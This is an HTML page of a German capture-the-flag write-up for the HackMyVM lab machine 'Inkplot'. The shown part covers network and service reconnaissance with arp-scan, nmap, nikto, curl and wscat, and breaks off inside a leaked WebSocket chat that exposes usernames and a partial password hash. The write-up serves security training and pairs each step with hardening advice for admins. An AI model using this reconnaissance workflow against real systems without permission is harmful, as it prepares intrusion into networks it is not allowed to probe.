<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inkplot - HackMyVM - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
    <div class="header-bg">
        <h1>Inkplot - HackMyVM - Level: Medium - Bericht</h1>
        <div class="level-container medium"> <!-- Klasse 'medium' für CSS-Farbanpassung -->
            <h2>Medium</h2> <!-- Kein Inline Style, Farbe kommt von CSS über .level-container.medium h2 -->
            <div class="circle">
                <div class="segment segment-1"></div> <!-- Farben per CSS für .medium .segment-X -->
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div> <!-- Hintergrundfarbe per CSS für .medium .inner -->
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">wscat</div>
                <div class="tool-item">nano</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">cd</div>
                <div class="tool-item">import</div>
                <div class="tool-item">json</div>
                <div class="tool-item">argparse</div>
                <div class="tool-item">Crypto.Cipher</div>
                <div class="tool-item">base64</div>
                <div class="tool-item">echo</div>
                <div class="tool-item">chmod</div>
                <div class="tool-item">cp</div>
                <div class="tool-item">nc</div>
                <div class="tool-item">find</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="analysis">
                **Analyse:** Wie immer beginne ich den Pentest mit der Aufklärung des Netzwerks, um das Zielsystem zu lokalisieren. Ich verwende `arp-scan` mit der Option `-l`, um alle Geräte in meinem lokalen Subnetz zu scannen und filtere die Ausgabe mit `grep "PCS"`, um Systeme mit einer MAC-Adresse zu finden, die auf VirtualBox-VMs hinweist. Mit `awk '{print $1}'` extrahiere ich schließlich die IP-Adresse der gefundenen Maschine.
            </p>
            <p class="evaluation">
                **Bewertung:** Dieser Befehl ist ein schneller und effizienter Weg, um die IP-Adresse der Ziel-VM im lokalen Netzwerk zu identifizieren. Das Wissen um die Virtualisierungsplattform (PCS/VirtualBox) erlaubt eine gezielte Filterung und beschleunigt den Prozess.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Netzwerk-Scanner wie `arp-scan` oder `netdiscover` zu Beginn, um Ziele im lokalen Netz zu identifizieren. Sei auf Hinweise wie MAC-Adressen-Prefixe vorbereitet, die auf die Umgebung schließen lassen.
                <br>**Empfehlung (Admin):** Überwache dein Netzwerk auf ARP-Scans. Standard-MAC-Adressen-Prefixe für virtuelle Maschinen können Angreifern helfen, Ziele schneller zu identifizieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">192.168.2.43</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Nachdem die IP-Adresse des Zielsystems (192.168.2.43) ermittelt wurde, füge ich einen Eintrag in meine lokale `/etc/hosts`-Datei hinzu. Ich verwende den Texteditor `vi` und füge die Zeile `192.168.2.43 inplot.hmv` hinzu.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Eintragen des Hostnamens in die `hosts`-Datei ist eine Standardpraxis, um das Zielsystem mit einem aussagekräftigeren Namen ansprechen zu können. Dies macht die nachfolgenden Befehle und URLs lesbarer und einfacher zu verwalten, insbesondere wenn virtuelle Hosts im Spiel sind, auch wenn dies hier primär der Bequemlichkeit dient.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verwende die lokale `hosts`-Datei für eine klarere Benennung von Zielen während des Tests.
                <br>**Empfehlung (Admin):** Stelle sicher, dass interne Hostnamen nicht leicht zu erraten sind und keine Informationen über interne Netzwerke preisgeben, falls sie nach außen gelangen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
                </div>
                <div class="terminal">
                    <pre> <span class="command">192.168.2.43    inplot.hmv</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich führe einen schnellen Nmap-Scan auf dem Zielsystem (192.168.2.43) durch, um offene Ports und darauf laufende Dienste zu identifizieren. Die Optionen sind `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (alle Ports) und `-T5` (aggressives Timing). Die Ausgabe filtere ich zunächst mit `grep open`, um einen schnellen Überblick über die erreichbaren Dienste zu erhalten.
            </p>
            <p class="evaluation">
                **Bewertung:** Dieser Scan zeigt zwei offene Ports: 22/tcp (SSH) und 3000/tcp (WebSocket). SSH ist ein Standarddienst, der oft eine Angriffsfläche bietet (schwache Passwörter, bekannte Schlüssel). Der Dienst auf Port 3000 ist als "websocket Ogar agar.io server" gekennzeichnet, was auf eine spezifische Anwendung hinweist, die weiter untersucht werden muss. Der nicht standardmäßige Port 3000 ist auffällig.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Führe immer vollständige Port-Scans durch, um alle erreichbaren Dienste zu finden. Priorisiere Standarddienste (SSH) und ungewöhnliche Dienste auf hohen Ports.
                <br>**Empfehlung (Admin):** Führe regelmäßige Port-Scans deines eigenen Netzwerks durch. Schließe oder schränke den Zugriff auf Ports ein, die nicht zwingend öffentlich erreichbar sein müssen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.43 | grep open</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2 (prot<span class="command">o</span><span class="command">c</span><span class="command">o</span>l 2.<span class="command">0</span>)</span>
<span class="command">3<span class="command">0</span><span class="command">0</span><span class="command">0</span>/t<span class="command">c</span>p open  web<span class="command">s</span><span class="command">o</span><span class="command">c</span>ket <span class="command">O</span>g<span class="command">a</span>r <span class="command">a</span>g<span class="command">a</span>r.i<span class="command">o</span> <span class="command">s</span>er<span class="command">v</span>er</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich führe den vollständigen Nmap-Scan auf 192.168.2.43 mit denselben Optionen (`-sS`, `-sC`, `-sV`, `-p-`, `-T5`, `-AO`) durch. Die vollständige Ausgabe liefert mehr Details über die gefundenen Dienste und das Betriebssystem.
            </p>
            <p class="evaluation">
                **Bewertung:** Die vollständige Ausgabe bestätigt die Dienste auf Port 22 (OpenSSH 9.2p1 Debian 2) und 3000 (WebSocket Ogar agar.io server). Die SSH-Hostkeys werden angezeigt, was nützlich sein kann, um Man-in-the-Middle-Angriffe zu erkennen oder um bekannte Hosts abzugleichen. Die aggressive OS-Erkennung schätzt das System als Linux 4.X|5.X, wahrscheinlich OpenWrt oder Debian, was mit der SSH-Version übereinstimmt. Diese Informationen bestätigen die Angriffsflächen: SSH und der WebSocket-Dienst.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysiere die vollständige Nmap-Ausgabe sorgfältig auf Versionsinformationen und Skriptergebnisse. Nutze die erkannten Dienste und Versionen, um nach bekannten Schwachstellen zu suchen.
                <br>**Empfehlung (Admin):** Halte SSH-Server und das Betriebssystem auf dem neuesten Stand. Überwache SSH-Login-Versuche. Stelle sicher, dass nur die benötigten Dienste laufen und identifizierbar sind. Deaktiviere die aggressive OS-Erkennung, wenn sie nicht benötigt wird.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.43</span></div>
                </div>
                <div class="terminal">
                    <pre>Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at 2<span class="command">0</span>25-<span class="command">0</span>6-14 21:43 CEST
Nmap <span class="command">s<span class="command">c</span><span class="command">a</span>n rep<span class="command">o</span>rt f<span class="command">o</span>r inpl<span class="command">o</span>t.h<span class="command">m</span><span class="command">v</span> (192.168.2.43)</span>
<span class="command">H<span class="command">o</span><span class="command">s</span>t is <span class="command">u</span>p (0.00013<span class="command">s</span> l<span class="command">a</span>ten<span class="command">c</span>y).</span>
N<span class="command">o</span>t <span class="command">s</span>h<span class="command">o</span>wn: 65533 <span class="command">c</span>l<span class="command">o</span><span class="command">s</span>ed t<span class="command">c</span>p <span class="command">p<span class="command">o</span>rt<span class="command">s</span> (re<span class="command">s</span>et)</span>
<span class="command">PORT     STATE SERVICE   VERSION</span>
<span class="command">22/t<span class="command">c</span>p   <span class="command">o</span>pen  <span class="command">s</span><span class="command">s</span>h       <span class="command">O</span>pen<span class="command">S</span><span class="command">S</span>H 9.2p1 Deb<span class="command">i</span><span class="command">a</span>n 2 (pr<span class="command">o</span>t<span class="command">o</span><span class="command">c</span><span class="command">o</span>l 2.<span class="command">0</span>)</span>
| <span class="command">s</span><span class="command">s</span>h-h<span class="command">o</span><span class="command">s</span>tkey:
|   256 <span class="command">dd:83:d<span class="command">a</span>:<span class="command">c</span>b:45:d3:<span class="command">a</span>8:e<span class="command">a</span>:<span class="command">c</span>6:be:19:03:45:76:43:8<span class="command">c</span> (EC<span class="command">D<span class="command">S</span>A)</span></span>
|_  256 <span class="command">e5:5f:7f:25:<span class="command">a</span><span class="command">a</span>:<span class="command">c</span>0:18:04:<span class="command">c</span>4:46:98:b3:5d:<span class="command">a</span>5:2b:48 (ED25519)</span>
<span class="command">3000/t<span class="command">c</span>p <span class="command">o</span>pen  web<span class="command">s</span><span class="command">o</span><span class="command">c</span>ket <span class="command">O</span>g<span class="command">a</span>r <span class="command">a</span>g<span class="command">a</span>r.i<span class="command">o</span> <span class="command">s</span>er<span class="command">v</span>er</span>
<span class="command">MAC Addre<span class="command">ss</span>: <span class="command">08:00:27:F1:97:62 (PC<span class="command">S</span> <span class="command">S</span>y<span class="command">s</span>te<span class="command">m</span>te<span class="command">c</span>hn<span class="command">i</span>k/Or<span class="command">a</span><span class="command">c</span>le V<span class="command">i</span>rt<span class="command">u</span><span class="command">a</span>lB<span class="command">o</span>x <span class="command">v</span>irt<span class="command">u</span><span class="command">a</span>l NIC)</span></span>
De<span class="command">v</span>ice type: gener<span class="command">a</span>l p<span class="command">u</span>rp<span class="command">o</span><span class="command">s</span>e
<span class="command">R<span class="command">u</span>nn<span class="command">i</span>ng: L<span class="command">i</span>n<span class="command">u</span>x 4.X|5.X</span>
<span class="command">OS <span class="command">C</span>PE: <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span>:4 <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span>:5</span>
<span class="command">OS det<span class="command">a</span><span class="command">i</span>l<span class="command">s</span>: L<span class="command">i</span>n<span class="command">u</span>x 4.15 - 5.19, <span class="command">O</span>penWrt 21.<span class="command">0</span>2 (L<span class="command">i</span>n<span class="command">u</span>x 5.4)</span>
<span class="command">Netw<span class="command">o</span>rk Di<span class="command">s</span>t<span class="command">a</span>n<span class="command">c</span>e: 1 h<span class="command">o</span>p</span>
<span class="command">Ser<span class="command">v</span><span class="command">i</span><span class="command">c</span>e Info: <span class="command">OS</span>: L<span class="command">i</span>n<span class="command">u</span>x; <span class="command">CPE</span>: <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span></span>

<span class="command">TRACEROUTE</span>
<span class="command">H<span class="command">O</span>P RTT     ADDRE<span class="command">SS</span></span>
<span class="command">1   0.13 m<span class="command">s</span> i<span class="command">n</span>pl<span class="command">o</span>t.h<span class="command">m</span><span class="command">v</span> (192.168.2.43)</span>

<span class="command">Nmap d<span class="command">o</span>ne: 1 IP <span class="command">a</span>ddre<span class="command">ss</span> (1 h<span class="command">o</span><span class="command">s</span>t <span class="command">u</span>p) <span class="command">s<span class="command">c</span><span class="command">a</span>nned in 14.99 <span class="command">s</span>e<span class="command">c</span><span class="command">o</span>nd<span class="command">s</span></span>
</pre>
                </div>
            </div>
        </section>

        <!-- ENDE TEIL 1 -->
		        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis">
                **Analyse:** Zusätzlich zum Nmap-Scan führe ich einen weiteren Scan des Webdienstes auf Port 3000 mit dem Tool `nikto` durch. Nikto ist ein Webserver-Scanner, der nach einer Vielzahl von Schwachstellen, Fehlkonfigurationen und unsicheren Dateien sucht. Ich gebe die Ziel-URL mit Port an: `http://192.168.2.43:3000`.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Nikto-Scan auf Port 3000 liefert nur begrenzte Ergebnisse. Er meldet das Fehlen der HTTP-Sicherheitsheader `X-Frame-Options` und `X-Content-Type-Options`, findet aber keine CGI-Verzeichnisse oder andere spezifische Web-Schwachstellen. Der Server liefert kein Banner. Dies deutet darauf hin, dass Port 3000 zwar auf HTTP-Anfragen antwortet, aber möglicherweise keinen vollständigen Webserver hostet oder eine spezifische Anwendung läuft, die Nikto nicht umfassend prüfen kann. Dies bestätigt die Nmap-Angabe "websocket", die vermuten lässt, dass es sich nicht um einen Standard-HTTP-Dienst handelt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Führe Web-Scanner auch auf nicht standardmäßigen Ports aus, die im Nmap-Scan als offen gemeldet wurden. Interpretiere begrenzte Ergebnisse als Hinweis darauf, dass der Dienst möglicherweise kein Standard-HTTP spricht und andere Tools oder manuelle Untersuchung erforderlich sind.
                <br>**Empfehlung (Admin):** Stelle sicher, dass alle Webserver (auch auf nicht standardmäßigen Ports) grundlegende Sicherheitshärtungen aufweisen, wie das Setzen relevanter HTTP-Sicherheitsheader. Entferne oder maskiere Server-Banner, um Informationen über die verwendete Software zu reduzieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://192.168.2.43:3000</span></div>
                </div>
                <div class="terminal">
                    <pre>- Nikto v2.5.0
---------------------------------------------------------------------------
<span class="password">+ Target IP:          192.168.2.43</span>
<span class="password">+ Target Hostname:    192.168.2.43</span>
<span class="password">+ Target <span class="command">P<span class="command">o</span>rt:        3<span class="command">0</span><span class="command">0</span><span class="command">0</span></span></span>
<span class="password">+ <span class="command">S</span>t<span class="command">a</span>rt T<span class="command">i</span><span class="command">m</span>e:         2<span class="command">0</span>25-<span class="command">0</span>6-14 21:43:25 (GMT2)</span>
---------------------------------------------------------------------------
<span class="password">+ <span class="command">S</span>er<span class="command">v</span>er: No banner retri<span class="command">e</span><span class="command">v</span>ed</span>
<span class="password">+ /: The <span class="command">a</span>nti-<span class="command">c</span>l<span class="command">i</span><span class="command">c</span>kj<span class="command">ac</span>k<span class="command">i</span>ng X-Fr<span class="command">a</span><span class="command">m</span>e-<span class="command">O</span>pt<span class="command">i</span><span class="command">o</span>n<span class="command">s</span> he<span class="command">a</span>der <span class="command">i</span><span class="command">s</span> n<span class="command">o</span>t pre<span class="command">s</span>ent. <span class="command">S</span>ee: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span></span>
<span class="password">+ /: The X-C<span class="command">o</span>ntent-Type-<span class="command">O</span>pt<span class="command">i</span><span class="command">o</span>n<span class="command">s</span> he<span class="command">a</span>der <span class="command">i</span><span class="command">s</span> n<span class="command">o</span>t <span class="command">s</span>et. Th<span class="command">i</span><span class="command">s</span> <span class="command">c</span><span class="command">o</span>uld <span class="command">a</span>ll<span class="command">o</span>w the <span class="command">u</span><span class="command">s</span>er <span class="command">a</span>gent t<span class="command">o</span> render the <span class="command">c</span><span class="command">o</span>ntent <span class="command">o</span>f the <span class="command">s</span><span class="command">i</span>te <span class="command">i</span>n <span class="command">a</span> d<span class="command">i</span>fferent f<span class="command">a</span><span class="command">s</span>h<span class="command">i</span><span class="command">o</span>n t<span class="command">o</span> the MIME type. <span class="command">S</span>ee: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span></span>
+ N<span class="command">o</span> <span class="command">CGI</span> Dire<span class="command">c</span>t<span class="command">o</span>r<span class="command">i</span>e<span class="command">s</span> f<span class="command">o</span><span class="command">u</span>nd (<span class="command">u</span><span class="command">s</span>e '<span class="command">-<span class="command">C</span> <span class="command">a</span><span class="command">l</span><span class="command">l</span>' t<span class="command">o</span> f<span class="command">o</span>r<span class="command">c</span>e <span class="command">c</span>he<span class="command">c</span>k <span class="command">a</span><span class="command">l</span>l p<span class="command">os</span><span class="command">s</span>ible d<span class="command">i</span>r<span class="command">s</span>)</span>
<span class="password">+ 8101 req<span class="command">u</span>e<span class="command">s</span>t<span class="command">s</span>: 0 err<span class="command">o</span>r(<span class="command">s</span>) <span class="command">a</span>nd 2 <span class="command">i</span>te<span class="command">m</span>(<span class="command">s</span>) rep<span class="command">o</span>rted <span class="command">o</span>n re<span class="command">m</span><span class="command">o</span>te h<span class="command">o</span><span class="command">s</span>t</span>
<span class="password">+ End T<span class="command">i</span><span class="command">m</span>e:           2<span class="command">0</span>25-<span class="command">0</span>6-14 21:43:39 (GMT2) (14 <span class="command">s</span>e<span class="command">c</span><span class="command">o</span>nd<span class="command">s</span>)</span>
---------------------------------------------------------------------------
<span class="password">+ 1 h<span class="command">o</span><span class="command">s</span>t(<span class="command">s</span>) te<span class="command">s</span>ted</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um das Verhalten des Dienstes auf Port 3000 besser zu verstehen, sende ich eine HEAD-Anfrage mit `curl -Iv`. Die Option `-I` bewirkt, dass nur die Header der Antwort abgerufen werden, und `-v` liefert detaillierte Informationen über den Verbindungsaufbau und die gesendeten/empfangenen Header.
            </p>
            <p class="evaluation">
                **Bewertung:** Diese `curl`-Anfrage liefert ein entscheidendes Ergebnis: Der Server antwortet mit dem HTTP-Statuscode `426 Upgrade Required`. Dieser Code wird spezifisch verwendet, um dem Client mitzuteilen, dass er ein anderes Protokoll verwenden muss, typischerweise WebSocket (wie in Nmap vermutet). Der Dienst ist also kein Standard-HTTP-Server, sondern ein WebSocket-Endpunkt, der einen Protokoll-Upgrade erwartet. Dies erklärt, warum Nikto nur grundlegende HTTP-Header-Probleme fand.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuche Dienste auf ungewöhnlichen Ports immer manuell mit Tools wie `curl`, um ihr Verhalten und das erwartete Protokoll zu identifizieren, bevor du spezialisierte Tools einsetzt. Achte auf HTTP-Statuscodes, insbesondere solche außerhalb der standardmäßigen 2xx oder 3xx Bereiche.
                <br>**Empfehlung (Admin):** Verstehe die HTTP-Statuscodes, die deine Anwendungen zurückgeben. Stelle sicher, dass Dienste, die Protokoll-Upgrades erfordern (wie WebSocket), korrekt konfiguriert sind und klare, nicht-informationsreiche Antworten auf unpassende Anfragen geben.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://192.168.2.43:3000 -Iv</span></div>
                </div>
                <div class="terminal">
                    <pre>*   Trying <span class="command">192.168.2.43:3000</span>...
* Connected to <span class="command">192.168.2.43 (192.168.2.43)</span> <span class="command">p<span class="command">o</span>rt 3<span class="command">0</span><span class="command">0</span><span class="command">0</span></span>
* u<span class="command">s</span>ing HTTP/1.x
> HEAD / HTTP/1.1
> Ho<span class="command">s</span>t: 192.<span class="command">1</span>68.2.43:3000
> User-Agent: curl/8.13.0
> Accept: */*
>
* Req<span class="command">u</span>e<span class="command">s</span>t <span class="command">c</span><span class="command">o</span>mple<span class="command">t</span>ely <span class="command">s</span>ent <span class="command">o</span>ff
< <span class="password">HTTP/1.1 426 Upgr<span class="command">a</span>de Req<span class="command">u</span>ired</span> <span class="password"><-- Ent<span class="command">s</span><span class="command">c</span>he<span class="command">i</span>dende<span class="command">r</span> <span class="command">S</span>t<span class="command">a</span>tu<span class="command">sc</span><span class="command">o</span>de!</span>
HTTP/1.1 426 Upgrade Req<span class="command">u</span>ired
< Content-Length: 16
C<span class="command">o</span>ntent-Length: 16
< C<span class="command">o</span>ntent-Type: text/pl<span class="command">a</span>in
C<span class="command">o</span>ntent-Type: text/pl<span class="command">a</span>in
< Date: <span class="command">S<span class="command">a</span>t, 14 Jun 2025 19:44:47 GMT</span>
Date: <span class="command">S<span class="command">a</span>t, 14 Jun 2025 19:44:47 GMT</span>
< <span class="command">C<span class="command">o</span>nne<span class="command">c</span>ti<span class="command">o</span>n: keep-<span class="command">a</span>li<span class="command">v</span>e</span>
<span class="command">C<span class="command">o</span>nne<span class="command">c</span>ti<span class="command">o</span>n: keep-<span class="command">a</span>li<span class="command">v</span>e</span>
< Keep-Ali<span class="command">v</span>e: time<span class="command">o</span>ut=5
Keep-Ali<span class="command">v</span>e: time<span class="command">o</span>ut=5
<

* C<span class="command">o</span>nne<span class="command">c</span>t<span class="command">i</span><span class="command">o</span>n #<span class="command">0</span> t<span class="command">o</span> h<span class="command">o</span><span class="command">s</span>t 192.168.2.43 left <span class="command">i</span>nt<span class="command">a</span><span class="command">c</span>t
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich versuche, die Adresse `http://inplot.hmv:3000/` in einem Standard-Webbrowser aufzurufen.
            </p>
            <p class="evaluation">
                **Bewertung:** Wie erwartet nach dem `curl`-Ergebnis, zeigt der Browser lediglich die Meldung "Upgrade Required" an. Dies liegt daran, dass ein Standard-Browser versucht, eine normale HTTP-Verbindung aufzubauen, während der Server einen WebSocket-Protokoll-Upgrade erwartet. Dies bestätigt erneut, dass ich einen WebSocket-Client benötige, um mit dem Dienst zu interagieren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Browser-Checks, um die offensichtliche Darstellung eines Dienstes zu sehen. Sei dir bewusst, dass dies bei Nicht-Standard-HTTP-Diensten begrenzt nützlich sein kann.
                <br>**Empfehlung (Admin):** Stelle sicher, dass nicht-HTTP-Dienste auf HTTP-Ports (wie 80 oder 443) nicht Standard-HTTP-Antworten geben, die unnötige Informationen preisgeben.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre>http://inplot.hmv:3000/

<span class="password">Upgrade Required</span></pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich beziehe mich noch einmal auf den Hinweis aus dem Nmap-Scan, der den Dienst auf Port 3000 als "websocket Ogar agar.io server" identifiziert hat. "Ogar" ist eine bekannte Open-Source-Implementierung des beliebten Online-Spiels agar.io.
            </p>
            <p class="evaluation">
                **Bewertung:** Dieser Hinweis ist wichtig, da er den Typ der Anwendung auf Port 3000 spezifiziert. Es handelt sich wahrscheinlich um einen Spielserver oder eine darauf basierende Anwendung. Dies deutet darauf hin, dass die Kommunikation über WebSockets möglicherweise einem spezifischen, spielbezogenen Protokoll folgt oder zumindest eine Art von textbasierter Schnittstelle bietet, wie sie oft in solchen Servern zu finden ist (z. B. für Chat oder Konsolenbefehle).
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Recherchiere identifizierte Anwendungsnamen oder Versionen sofort auf bekannte Schwachstellen oder Standardkonfigurationen. Verstehe den Zweck und das erwartete Protokoll des Dienstes.
                <br>**Empfehlung (Admin):** Betreibe nur notwendige Dienste und Anwendungen. Vermeide die Veröffentlichung interner oder Test-Anwendungen im Internet.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre>nmap hinweis:  web<span class="command">s</span>o<span class="command">c</span>ket <span class="command">O</span>g<span class="command">a</span>r <span class="command">a</span>g<span class="command">a</span>r.i<span class="command">o</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um mit dem WebSocket-Dienst auf Port 3000 zu interagieren, verwende ich das Tool `wscat`. Dies ist ein Befehlszeilen-Tool, das speziell für die Kommunikation mit WebSocket-Servern entwickelt wurde. Ich verbinde mich mit dem Befehl `wscat -c ws://inplot.hmv:3000`, wobei `-c` für "connect" steht und die URL das WebSocket-Protokoll (`ws://`) und den Hostnamen/Port angibt. Nach erfolgreichem Verbindungsaufbau kann ich Nachrichten senden und empfangen. Die empfangene Ausgabe zeigt eine Konversation, die wie ein IRC-Chat aussieht ("Welcome to our InkPlot secret IRC server"). Die Benutzer `Bob`, `Alice` und `Leila` diskutieren über das Abschalten von "Leila", ein "defense system" und erwähnen einen "MD5 hash" mit dem Präfix `d51540...`. Meine eigenen Eingaben (`ls`, `id`, etc.) werden einfach mit "Leila: " davor zurückgegeben, was darauf hindeutet, dass dies entweder ein sehr einfacher Echo-Dienst ist oder spezifische Kommandos erwartet werden, die ich noch nicht kenne.
            </p>
            <p class="evaluation">
                **Bewertung:** Der WebSocket-Dienst ist eine textbasierte Schnittstelle, die offenbar als "secret IRC server" dient. Die Konversation zwischen Bob und Alice ist ein massives Informationsleck! Sie enthüllt nicht nur die Benutzernamen `Leila`, `Bob` und `Alice`, sondern auch einen partiellen MD5-Hash (`d51540...`) und den Kontext, dass dieser Hash relevant ist, um "Leila off her digital pedestal" zu stoßen. Dies ist ein klarer Hinweis darauf, dass der Hash zu einem Passwort für das Benutzerkonto `leila` gehört und für den Initial Access benötigt wird. Die Tatsache, dass meine Kommandos einfach zurückgegeben werden, könnte auf eine grundlegende Kommandoausführung hindeuten, ist aber in erster Linie eine Bestätigung, dass der Server meine Eingaben verarbeitet.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn du auf ungewöhnliche Dienste stößt, versuche, mit geeigneten Clients zu interagieren (z.B. `wscat` für WebSockets, `nc` für rohe TCP/UDP-Verbindungen). Suche nach Informationen in Nachrichten oder Service-Bannern. Priorisiere das Sammeln von Benutzernamen und potenziellen Zugangsdaten.
                <br>**Empfehlung (Admin):** Speichere niemals sensitive Konversationen oder Zugangsdaten (auch keine partiellen Hashes) in Diensten, die potenziell zugänglich sind. Überprüfe interne Kommunikationsplattformen auf Informationslecks. Stelle sicher, dass unauthentifizierte Benutzer keinen Zugriff auf interne Dienste oder sensible Daten haben.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wscat -c ws://inplot.hmv:3000</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">Connected (press CTRL+C t<span class="command">o</span> <span class="command">q</span>u<span class="command">i</span>t)</span>
<span class="password">< Wel<span class="command">c</span><span class="command">o</span>me t<span class="command">o</span> <span class="command">o</span>ur InkPl<span class="command">o</span>t <span class="command">s</span>e<span class="command">c</span>ret IRC <span class="command">s</span>er<span class="command">v</span>er</span>
<span class="password">< B<span class="command">o</span>b: Ali<span class="command">c</span>e, re<span class="command">a</span>dy t<span class="command">o</span> kn<span class="command">o</span><span class="command">c</span>k <span class="command">o</span>ur n<span class="command">a</span>i<span class="command">v</span>e Le<span class="command">i</span>l<span class="command">a</span> <span class="command">o</span>ff her d<span class="command">i</span>git<span class="command">a</span>l pede<span class="command">s</span>t<span class="command">a</span>l?</span>
<span class="password">< Ali<span class="command">c</span>e: B<span class="command">o</span>b, I'<span class="command">v</span>e been dre<span class="command">a</span><span class="command">m</span><span class="command">i</span>ng <span class="command">a</span>b<span class="command">o</span>ut th<span class="command">i</span><span class="command">s</span> f<span class="command">o</span>r week<span class="command">s</span>. Le<span class="command">i</span>l<span class="command">a</span> h<span class="command">a</span><span class="command">s</span> n<span class="command">o</span> <span class="command">i</span>de<span class="command">a</span> wh<span class="command">a</span>t'<span class="command">s</span> <span class="command">a</span>b<span class="command">o</span>ut t<span class="command">o</span> h<span class="command">i</span>t her.</span>
<span class="password">< B<span class="command">o</span>b: Ex<span class="command">ac</span>tly. We're g<span class="command">o</span>nn<span class="command">a</span> te<span class="command">a</span>r her defen<span class="command">s</span>e <span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span> <span class="command">a</span>p<span class="command">a</span>rt. <span class="command">S</span>he w<span class="command">o</span>n't <span class="command">s</span>ee <span class="command">i</span>t <span class="command">c</span><span class="command">o</span><span class="command">m</span><span class="command">i</span>ng.</span>
